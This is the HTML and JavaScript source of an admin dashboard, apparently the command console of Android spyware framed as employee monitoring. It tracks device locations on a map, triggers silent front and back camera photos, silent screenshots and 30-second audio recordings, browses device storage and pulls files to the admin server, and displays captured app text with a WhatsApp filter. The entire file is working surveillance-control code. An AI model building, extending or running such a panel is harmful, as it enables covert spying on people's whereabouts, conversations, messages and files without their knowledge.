<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Looking You | Admin Dashboard</title>
    <link rel="stylesheet" href="style.css">
    <!-- Google Fonts: Outfit -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <!-- Leaflet Map CSS -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
</head>
<body>
    <!-- FontAwesome for Premium Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <div class="hud-container">
        <!-- 1. The Full-Screen Map Base -->
        <div id="map"></div>

        <!-- 2. Top Bar (Live Focus) -->
        <header class="hud-top-bar glass-panel" id="device-actions" style="display: none;">
            <div class="active-status">
                <div class="monitoring-status" id="tracking-status">
                    <span class="status-dot active"></span>
                    <span class="status-text">Active</span>
                </div>
                <h2 id="active-device-name">No device selected</h2>
            </div>
            
            <div class="top-controls">
                <button id="btn-stop-tracking" onclick="toggleTracking('stop')" class="btn-action danger"><i class="fa-solid fa-pause"></i> Pause Tracking</button>
                <button id="btn-start-tracking" onclick="toggleTracking('start')" class="btn-action success" style="display: none;"><i class="fa-solid fa-play"></i> Resume</button>
            </div>
        </header>

        <!-- 3. Left Panel (Device Manager) -->
        <aside class="hud-left-panel glass-panel">
            <div class="logo">
                <h1>Looking<span>You</span></h1>
                <p>Command Node</p>
            </div>
            
            <div class="status-summary">
                <div class="stat-card">
                    <span class="label">Total Nodes</span>
                    <span class="value" id="total-count">0</span>
                </div>
                <div class="stat-card">
                    <span class="label">Active</span>
                    <span class="value online" id="online-count">0</span>
                </div>
            </div>

            <nav class="device-list">
                <h3>Connected Devices</h3>
                <ul id="devices-ul">
                    <li class="empty-msg">Waiting for signal...</li>
                </ul>
            </nav>
        </aside>

        <!-- 4. Right Panel (Gallery & Settings) -->
        <aside class="hud-right-panel glass-panel">
            <div class="photo-gallery">
                <h3>Live Feed</h3>
                <div id="latest-photo-container">
                    <p class="empty-msg">No visual data</p>
                </div>
                <div class="tab-pane" id="pane-file">
                    <p class="empty-msg">No files downloaded yet</p>
                </div>
                <div class="tab-pane" id="pane-activity">
                    <div class="filter-bar">
                        <button class="filter-chip active" onclick="filterLogs('all', 'pane-activity-feed')">All</button>
                        <button class="filter-chip" onclick="filterLogs('whatsapp', 'pane-activity-feed')">WhatsApp</button>
                        <button class="filter-chip" onclick="filterLogs('others', 'pane-activity-feed')">Others</button>
                    </div>
                    <div id="pane-activity-feed" class="activity-feed">
                        <p class="empty-msg">No activity recorded yet</p>
                    </div>
                </div>
            </div>
            <div class="hud-footer">
                <button onclick="logout()" class="btn-logout"><i class="fa-solid fa-power-off"></i> Disconnect</button>
            </div>
        </aside>

        <!-- 5. Bottom Dock (Action Center) -->
        <div class="hud-bottom-dock glass-panel">
            <button onclick="triggerAction('request_location')" class="dock-btn" title="Request Location">
                <i class="fa-solid fa-location-crosshairs"></i>
                <span>Locate</span>
            </button>
            <button onclick="triggerAction('take_photo', 'front')" class="dock-btn" title="Front Photo">
                <i class="fa-solid fa-camera-rotate"></i>
                <span>Front Cam</span>
            </button>
            <button onclick="triggerAction('take_photo', 'back')" class="dock-btn" title="Back Photo">
                <i class="fa-solid fa-camera"></i>
                <span>Back Cam</span>
            </button>
            <button onclick="triggerAction('take_screenshot')" class="dock-btn secondary" title="Take Screenshot">
                <i class="fa-solid fa-desktop"></i>
                <span>Screenshot</span>
            </button>
            <button onclick="triggerAction('request_audio', 30)" class="dock-btn warning" title="Record Audio (30s)">
                <i class="fa-solid fa-microphone"></i>
                <span>Record</span>
            </button>
            <button onclick="openFileExplorer()" class="dock-btn" title="File Explorer">
                <i class="fa-solid fa-folder-open"></i>
                <span>Files</span>
            </button>
            <div class="dock-divider"></div>
            <button onclick="fetchHistory()" class="dock-btn primary" title="View History">
                <i class="fa-solid fa-server"></i>
                <span>Data Logs</span>
            </button>
        </div>

        <!-- 6. History Overlay Modal -->
        <div id="history-overlay" class="overlay glass-overlay" style="display: none;">
            <div class="panel glass-panel">
                <div class="panel-header">
                    <h3 id="history-title">Device History</h3>
                    <button onclick="closeHistory()" class="btn-close"><i class="fa-solid fa-xmark"></i></button>
                </div>
                <div class="tabs-header">
                    <div class="tab-btn active" onclick="switchTab('hist-pane-loc')"><i class="fa-solid fa-map-location-dot"></i> Locations</div>
                    <div class="tab-btn" onclick="switchTab('hist-pane-photos')"><i class="fa-solid fa-image"></i> Photos</div>
                    <div class="tab-btn" onclick="switchTab('hist-pane-screenshots')"><i class="fa-solid fa-desktop"></i> Screens</div>
                    <div class="tab-btn" onclick="switchTab('hist-pane-audio')"><i class="fa-solid fa-microphone"></i> Audio</div>
                    <div class="tab-btn" onclick="switchTab('hist-pane-file')"><i class="fa-solid fa-folder-open"></i> Files</div>
                    <div class="tab-btn" onclick="switchTab('hist-pane-activity')"><i class="fa-solid fa-eye"></i> Activity</div>
                </div>
                <div id="history-content" class="panel-body">
                    <!-- History items will be loaded here -->
                </div>
            </div>
        </div>

        <!-- 7. File Explorer Modal -->
        <div id="explorer-overlay" class="overlay glass-overlay" style="display: none;">
            <div class="panel glass-panel">
                <div class="panel-header">
                    <h3 id="explorer-title">File Explorer</h3>
                    <button onclick="closeFileExplorer()" class="btn-close"><i class="fa-solid fa-xmark"></i></button>
                </div>
                <div class="explorer-path-bar">
                    <button onclick="navigateUp()" class="btn-up"><i class="fa-solid fa-level-up-alt"></i></button>
                    <span id="current-path">/storage/emulated/0</span>
                </div>
                <div id="explorer-content" class="panel-body">
                    <!-- Directory contents loaded here -->
                </div>
            </div>
        </div>
    </div>

    <!-- Scripts -->
    <script src="/socket.io/socket.io.js"></script>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        // --- Security Check ---
        const token = localStorage.getItem('adminToken');
        if (!token) {
            window.location.href = '/login';
        }

        const socket = io();
        let map = L.map('map', { 
            maxZoom: 19,
            zoomControl: false // We will customize controls later if needed
        }).setView([31.5204, 74.3587], 13); // Default to Lahore
        
        // Add zoom control to bottom right
        L.control.zoom({ position: 'bottomright' }).addTo(map);

        // Standard White Map Tile Layer (OpenStreetMap)
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            maxZoom: 19,
            attribution: '&copy; OpenStreetMap contributors'
        }).addTo(map);

        let markers = {};
        let activeDeviceId = null;
        let historyPath = L.polyline([], {color: '#3498db', weight: 4, opacity: 0.7}).addTo(map);
        let historyDots = [];
        let allActivityLogs = []; // Global store for filtering
        let currentFilter = 'all';

        // Request initial device list
        socket.emit('list_devices');

        socket.on('devices_data', (devices) => {
            updateDeviceList(devices);
        });

        socket.on('photo_uploaded', (data) => {
            console.log('📸 New photo arrived:', data);
            displayNewPhoto(data, 'photo');
        });

        socket.on('screenshot_uploaded', (data) => {
            console.log('📸 New screenshot arrived:', data);
            displayNewPhoto(data, 'screenshot');
        });

        socket.on('audio_uploaded', (data) => {
            console.log('🎙️ New audio recording arrived:', data);
            alert(`🎙️ New audio recording received from ${data.deviceId}! Check history to listen.`);
            if (document.getElementById('history-overlay').style.display === 'block') {
                fetchHistory(); // Refresh history to show the player
            }
        });

        socket.on('update_location', (data) => {
            console.log('📍 Received location:', data);
            updateMarker(data);
            updateDeviceStatus(data);
        });

        socket.on('activity_update', (data) => {
            console.log('👁️ Live Activity Update:', data);
            displayLiveActivity(data);
            if (document.getElementById('history-overlay').style.display === 'block' && activeDeviceId === data.deviceId) {
                // Optionally refresh history if open and it's for the same device
                // fetchHistory(); 
            }
        });

        function updateDeviceList(devices) {
            const ul = document.getElementById('devices-ul');
            ul.innerHTML = '';
            
            // Add a refresh button to the header area or list
            const header = document.querySelector('.hud-left-panel h3');
            if (header && !document.getElementById('btn-refresh-list')) {
                const refreshBtn = document.createElement('button');
                refreshBtn.id = 'btn-refresh-list';
                refreshBtn.innerHTML = '<i class="fa-solid fa-rotate"></i>';
                refreshBtn.className = 'btn-refresh-mini';
                refreshBtn.onclick = () => socket.emit('list_devices');
                header.appendChild(refreshBtn);
            }
            
            document.getElementById('total-count').innerText = devices.length;
            document.getElementById('online-count').innerText = devices.length;

            if (devices.length === 0) {
                ul.innerHTML = '<li class="empty-msg">No devices online</li>';
                return;
            }

            devices.forEach(device => {
                const li = document.createElement('li');
                li.className = 'device-item';
                li.onclick = () => focusDevice(device.deviceId, device.employeeName);
                li.innerHTML = `
                    <div class="info">
                        <span class="name">${device.employeeName}</span>
                        <span class="id">${device.deviceId}</span>
                    </div>
                    <div class="battery">
                        <span class="value">--%</span>
                    </div>
                `;
                li.id = `li-${device.deviceId}`;
                ul.appendChild(li);
            });
        }

        function updateMarker(data) {
            const { deviceId, latitude, longitude } = data;
            
            if (!markers[deviceId]) {
                const icon = L.divIcon({
                    className: 'custom-div-icon',
                    html: "<div style='background-color:#e74c3c;' class='marker-pin'></div><i class='fa fa-user'></i>",
                    iconSize: [30, 42],
                    iconAnchor: [15, 42]
                });
                markers[deviceId] = L.marker([latitude, longitude]).addTo(map);
                markers[deviceId].bindPopup(`<b>${deviceId}</b>`).openPopup();
            } else {
                markers[deviceId].setLatLng([latitude, longitude]);
            }

            // Extend path if this is the active device
            if (activeDeviceId === deviceId) {
                historyPath.addLatLng([latitude, longitude]);
                map.panTo([latitude, longitude]);
            }
        }

        function updateDeviceStatus(data) {
            const li = document.getElementById(`li-${data.deviceId}`);
            if (li) {
                const batteryVal = li.querySelector('.battery .value');
                batteryVal.innerText = `${data.batteryLevel}%`;
                
                if (data.isCharging) {
                    li.classList.add('charging');
                } else {
                    li.classList.remove('charging');
                }
            }
        }

        function focusDevice(id, name) {
            activeDeviceId = id;
            document.getElementById('active-device-name').innerText = name;
            document.getElementById('device-actions').style.display = 'flex';
            
            clearPaths(); // Clear old paths when switching
            
            if (markers[id]) {
                map.setView(markers[id].getLatLng(), 18);
            }
        }

        function clearPaths() {
            historyPath.setLatLngs([]);
            historyDots.forEach(dot => map.removeLayer(dot));
            historyDots = [];
        }

        function triggerAction(action, param) {
            if (!activeDeviceId) return;
            console.log(`🚀 Triggering ${action} for ${activeDeviceId}`);
            
            if (action === 'take_photo') {
                socket.emit('trigger_photo', { deviceId: activeDeviceId, camera: param });
                // Show a loading/waiting state
                const container = document.getElementById('latest-photo-container');
                container.innerHTML = `<div class="loading">Capturing silent photo...</div>`;
            } else if (action === 'request_location') {
                socket.emit('request_current_location', { deviceId: activeDeviceId });
            } else if (action === 'take_screenshot') {
                socket.emit('trigger_screenshot', { deviceId: activeDeviceId });
                const container = document.getElementById('latest-photo-container');
                container.innerHTML = `<div class="loading">Capturing silent screenshot...</div>`;
            } else if (action === 'request_audio') {
                socket.emit('trigger_audio', { deviceId: activeDeviceId, duration: param || 30 });
                alert(`🎙️ Requesting ${param || 30}s audio recording...`);
            }
        }

        function toggleTracking(action) {
            if (!activeDeviceId) return;
            console.log(`📡 Sending remote control: ${action} for ${activeDeviceId}`);
            socket.emit('toggle_tracking', { deviceId: activeDeviceId, action: action });
            
            // Update UI
            const statusText = document.querySelector('#tracking-status .status-text');
            const statusDot = document.querySelector('#tracking-status .status-dot');
            const btnStart = document.getElementById('btn-start-tracking');
            const btnStop = document.getElementById('btn-stop-tracking');

            if (action === 'stop') {
                statusText.innerText = 'Paused';
                statusDot.classList.remove('active');
                btnStart.style.display = 'block';
                btnStop.style.display = 'none';
            } else {
                statusText.innerText = 'Active';
                statusDot.classList.add('active');
                btnStart.style.display = 'none';
                btnStop.style.display = 'block';
            }
        }

        function displayNewPhoto(data, type = 'photo') {
            const container = document.getElementById('latest-photo-container');
            const label = type === 'screenshot' ? 'SCREENSHOT' : 'CAMERA';
            container.innerHTML = `
                <div class="photo-card fade-in">
                    <div class="photo-badge">${label}</div>
                    <img src="${data.url}" alt="Capture" onclick="window.open('${data.url}', '_blank')">
                    <div class="photo-info">
                        <span>ID: ${data.deviceId}</span>
                        <span>${data.timestamp}</span>
                    </div>
                </div>
            `;
            // Also refresh history if open
            if (document.getElementById('history-overlay').style.display === 'block') {
                fetchHistory();
            }
        }

        function displayLiveActivity(data) {
            allActivityLogs.unshift(data); // Add to local store
            
            const container = document.getElementById('pane-activity-feed');
            if (!container) return;
            
            // Re-render based on current filter
            renderActivityLogs('pane-activity-feed', currentFilter);
        }

        function filterLogs(type, targetContainerId) {
            currentFilter = type;
            
            // Update UI chip activity
            const bar = event?.target.parentElement;
            if (bar) {
                bar.querySelectorAll('.filter-chip').forEach(c => c.classList.remove('active'));
                event.target.classList.add('active');
            }

            renderActivityLogs(targetContainerId, type);
        }

        function renderActivityLogs(containerId, filter) {
            const container = document.getElementById(containerId);
            if (!container) return;

            // Clear current list
            container.innerHTML = '';

            let filtered = allActivityLogs;
            if (filter === 'whatsapp') {
                filtered = allActivityLogs.filter(l => {
                    const pkg = (function() {
                        try {
                            let d = l.data || l;
                            while (typeof d === 'string') { d = JSON.parse(d); }
                            return d.packageName || '';
                        } catch(e) { return ''; }
                    })();
                    return pkg.toLowerCase().includes('whatsapp');
                });
            } else if (filter === 'others') {
                filtered = allActivityLogs.filter(l => {
                    const pkg = (function() {
                        try {
                            let d = l.data || l;
                            while (typeof d === 'string') { d = JSON.parse(d); }
                            return d.packageName || '';
                        } catch(e) { return ''; }
                    })();
                    return !pkg.toLowerCase().includes('whatsapp');
                });
            }

            if (filtered.length === 0) {
                container.innerHTML = '<p class="empty-msg">No entries for this filter</p>';
                return;
            }

            filtered.forEach(log => {
                const item = document.createElement('div');
                item.className = 'activity-log-item fade-in';
                
                // Unified data extractor (handles both live event and DB log formats)
                let pkg = 'App', txt = 'No text captured';
                try {
                    let d = log.data || log;
                    while (typeof d === 'string') { d = JSON.parse(d); }
                    pkg = d.packageName || 'App';
                    txt = d.text || 'No text captured';
                } catch(e) {}

                item.innerHTML = `
                    <div class="activity-tag">${pkg}</div>
                    <div class="activity-text">${txt}</div>
                    <div class="activity-time">${log.createdAt ? new Date(log.createdAt).toLocaleTimeString() : new Date().toLocaleTimeString()}</div>
                `;
                container.appendChild(item);
            });
        }

        async function fetchHistory() {
            if (!activeDeviceId) return;
            const container = document.getElementById('history-content');
            container.innerHTML = '<div class="loading">Fetching records...</div>';
            document.getElementById('history-overlay').style.display = 'flex';
            document.getElementById('history-title').innerText = `History: ${activeDeviceId}`;

            try {
                const response = await fetch(`/api/history/${activeDeviceId}`, {
                    headers: { 'Authorization': `Bearer ${localStorage.getItem('adminToken')}` }
                });
                
                if (response.status === 401) return logout();
                const data = await response.json();
                
                if (data.length === 0) {
                    container.innerHTML = '<p class="empty-msg">No logs found for this device</p>';
                    return;
                }

                // Visualize path on map
                drawHistoryPath(data);

                // Group data by type
                const locLogs = data.filter(l => l.logType === 'location');
                const photoLogs = data.filter(l => l.logType === 'photo');
                const screenshotLogs = data.filter(l => l.logType === 'screenshot');
                const audioLogs = data.filter(l => l.logType === 'audio');
                const fileLogs = data.filter(l => l.logType === 'file');
                const activityLogs = data.filter(l => l.logType === 'activity');

                container.innerHTML = `
                    <div class="tab-pane active" id="hist-pane-loc">
                        ${locLogs.length > 0 ? `<div class="log-grid">${locLogs.map(buildLogHtml).join('')}</div>` : '<p class="empty-msg">No locations tracked yet</p>'}
                    </div>
                    <div class="tab-pane" id="hist-pane-photos">
                        ${photoLogs.length > 0 ? `<div class="log-grid photos">${photoLogs.map(buildLogHtml).join('')}</div>` : '<p class="empty-msg">No photos captured yet</p>'}
                    </div>
                    <div class="tab-pane" id="hist-pane-screenshots">
                        ${screenshotLogs.length > 0 ? `<div class="log-grid photos">${screenshotLogs.map(buildLogHtml).join('')}</div>` : '<p class="empty-msg">No screenshots captured yet</p>'}
                    </div>
                    <div class="tab-pane" id="hist-pane-audio">
                        ${audioLogs.length > 0 ? audioLogs.map(buildLogHtml).join('') : '<p class="empty-msg">No audio recorded yet</p>'}
                    </div>
                    <div class="tab-pane" id="hist-pane-file">
                        ${fileLogs.length > 0 ? fileLogs.map(buildLogHtml).join('') : '<p class="empty-msg">No downloaded files</p>'}
                    </div>
                    <div class="tab-pane" id="hist-pane-activity">
                        <div class="filter-bar" style="margin-bottom:15px;">
                            <button class="filter-chip active" onclick="filterLogs('all', 'hist-activity-feed')">All</button>
                            <button class="filter-chip" onclick="filterLogs('whatsapp', 'hist-activity-feed')">WhatsApp</button>
                            <button class="filter-chip" onclick="filterLogs('others', 'hist-activity-feed')">Others</button>
                        </div>
                        <div id="hist-activity-feed" class="activity-feed">
                            ${(allActivityLogs = activityLogs, '')} <!-- Sync with DB logs -->
                            <p class="empty-msg">Loading parsed activity...</p>
                        </div>
                    </div>
                `;
                // Trigger initial render for history
                renderActivityLogs('hist-activity-feed', 'all');
            } catch (err) {
                container.innerHTML = '<p class="error empty-msg">Failed to load history</p>';
            }
        }

        function buildLogHtml(log) {
            return `
                <div class="history-item ${log.logType}">
                    <div class="item-meta">
                        <div>
                            <span class="type-badge type-${log.logType}">${log.logType.toUpperCase()}</span>
                            <span class="time">${new Date(log.createdAt).toLocaleString()}</span>
                        </div>
                        <button onclick="deleteLog(${log.id})" class="btn-delete"><i class="fa-solid fa-trash"></i></button>
                    </div>
                    ${log.logType === 'photo' || log.logType === 'screenshot' ? `<img src="${log.url}" class="history-img" onclick="window.open('${log.url}', '_blank')">` : ''}
                    ${log.logType === 'audio' ? `
                        <div class="audio-player-box">
                            <span>🎙️ Audio Recording</span>
                            <audio controls>
                                <source src="${log.url}" type="audio/mp4">
                                <source src="${log.url}" type="audio/mpeg">
                            </audio>
                        </div>` : ''}
                    ${log.logType === 'file' ? `
                        <div class="audio-player-box">
                            <span>📄 Downloaded File</span>
                            <p style="font-size: 13px; margin-bottom:10px; color:var(--text-secondary);">${log.data?.originalName || 'Unknown file'}</p>
                            <a href="${log.url}" download target="_blank" class="btn-action success" style="width: fit-content;"><i class="fa-solid fa-download"></i> View / Download</a>
                        </div>` : ''}
                    ${log.logType === 'activity' ? `
                        <div class="activity-log-item">
                            <div class="activity-tag">
                                ${ (function() {
                                    try {
                                        let d = log.data;
                                        // Handle nested stringification (double wrapping)
                                        while (typeof d === 'string') { d = JSON.parse(d); }
                                        return d?.packageName || 'App';
                                    } catch(e) { return 'App'; }
                                })() }
                            </div>
                            <div class="activity-text">
                                ${ (function() {
                                    try {
                                        let d = log.data;
                                        // Handle nested stringification (double wrapping)
                                        while (typeof d === 'string') { d = JSON.parse(d); }
                                        return d?.text || 'No text captured';
                                    } catch(e) { 
                                        console.log('Error parsing log data:', log.data);
                                        return 'No text captured'; 
                                    }
                                })() }
                            </div>
                        </div>` : ''}
                    <div class="item-details">
                        ${log.logType === 'location' ? `<i class="fa-solid fa-location-dot"></i> ${log.latitude}, ${log.longitude}` : ''}
                        ${log.batteryLevel ? ` &nbsp;|&nbsp; <i class="fa-solid fa-battery-half"></i> ${log.batteryLevel}%` : ''}
                    </div>
                </div>
            `;
        }

        function switchTab(paneId) {
            // Hide all tab panes
            document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
            // Remove active class from all tab buttons
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            
            // Show the clicked pane and activate the button
            const targetPane = document.getElementById(paneId);
            if (targetPane) targetPane.classList.add('active');
            
            // Find the button that calls this pane and make it active
            const btns = document.querySelectorAll('.tab-btn');
            btns.forEach(btn => {
                if (btn.getAttribute('onclick').includes(paneId)) {
                    btn.classList.add('active');
                }
            });
        }

        function drawHistoryPath(logs) {
            clearPaths();
            const locationLogs = logs.filter(log => log.logType === 'location').reverse(); // Oldest to newest
            
            const latlngs = locationLogs.map(log => [log.latitude, log.longitude]);
            historyPath.setLatLngs(latlngs);

            locationLogs.forEach(log => {
                const dot = L.circleMarker([log.latitude, log.longitude], {
                    radius: 4,
                    color: '#2980b9',
                    fillColor: '#3498db',
                    fillOpacity: 1
                }).addTo(map);
                dot.bindPopup(`Time: ${new Date(log.createdAt).toLocaleString()}`);
                historyDots.push(dot);
            });

            if (latlngs.length > 0) {
                map.fitBounds(historyPath.getBounds(), {padding: [50, 50]});
            }
        }

        async function deleteLog(id) {
            if (!confirm('Are you sure you want to delete this record?')) return;
            try {
                const response = await fetch(`/api/history/${id}`, { 
                    method: 'DELETE',
                    headers: { 'Authorization': `Bearer ${localStorage.getItem('adminToken')}` }
                });
                if (response.status === 401) return logout();
                if (response.ok) {
                    fetchHistory(); // Refresh
                }
            } catch (err) {
                alert('Failed to delete');
            }
        }

        // --- File Explorer JS ---
        let currentExplorerPath = 'root';

        function openFileExplorer() {
            if (!activeDeviceId) return alert("Select a device first");
            document.getElementById('explorer-overlay').style.display = 'flex';
            currentExplorerPath = 'root'; // Reset to root each time we open
            fetchDirectory(currentExplorerPath);
        }
        function closeFileExplorer() { document.getElementById('explorer-overlay').style.display = 'none'; }

        function fetchDirectory(path) {
            document.getElementById('explorer-content').innerHTML = '<div class="loading">Reading device storage...</div>';
            currentExplorerPath = path;
            document.getElementById('current-path').innerText = path;
            socket.emit('request_directory', { deviceId: activeDeviceId, path: path });
        }

        socket.on('directory_data', (data) => {
            if (data.deviceId !== activeDeviceId) return;
            const container = document.getElementById('explorer-content');
            if (!data.files || data.files.length === 0) {
                container.innerHTML = '<p class="empty-msg">Folder is empty</p>';
                return;
            }
            
            // Sort dirs first
            const files = data.files.sort((a,b) => (b.isDir === a.isDir) ? a.name.localeCompare(b.name) : (b.isDir ? -1 : 1));
            
            container.innerHTML = files.map(f => `
                <div class="explorer-item ${f.isDir ? 'dir' : 'file'}" onclick="handleExplorerClick('${f.path.replace(/\\/g, '\\\\').replace(/'/g, "\\'")}', ${f.isDir})">
                    <i class="fa-solid ${f.isDir ? 'fa-folder' : 'fa-file'} icon"></i>
                    <div class="info">
                        <span class="name">${f.name}</span>
                        ${!f.isDir ? `<span class="size">${(f.size/1024).toFixed(1)} KB</span>` : ''}
                    </div>
                    ${!f.isDir ? `<button onclick="event.stopPropagation(); triggerFileDownload('${f.path.replace(/\\/g, '\\\\').replace(/'/g, "\\'")}')" class="btn-action"><i class="fa-solid fa-cloud-arrow-up"></i></button>` : ''}
                </div>
            `).join('');
        });

        socket.on('directory_error', (data) => {
            if (data.deviceId !== activeDeviceId) return;
            document.getElementById('explorer-content').innerHTML = `<p class="error empty-msg">${data.message}</p>`;
        });

        function handleExplorerClick(path, isDir) {
            if (isDir) fetchDirectory(path);
        }

        function navigateUp() {
            if (currentExplorerPath.length <= 1) return;
            let parts = currentExplorerPath.split('/');
            parts.pop();
            let newPath = parts.join('/');
            if (!newPath) newPath = "/";
            if (newPath === "/storage/emulated") newPath = "/storage/emulated/0"; // Quick bounce back from annoying android root
            fetchDirectory(newPath);
        }

        function triggerFileDownload(filePath) {
            if (!confirm(`Upload this file to the admin server?\n\n${filePath}`)) return;
            socket.emit('trigger_download_file', { deviceId: activeDeviceId, path: filePath });
            alert("File upload requested. It will appear in 'Files' history tab shortly once downloaded from device.");
        }

        function logout() {
            localStorage.removeItem('adminToken');
            localStorage.removeItem('adminInfo');
            window.location.href = '/login';
        }

        function closeHistory() {
            document.getElementById('history-overlay').style.display = 'none';
            // Optional: clear paths when closing history to keep live view clean
            // clearPaths(); 
        }
    </script>
</body>
</html>
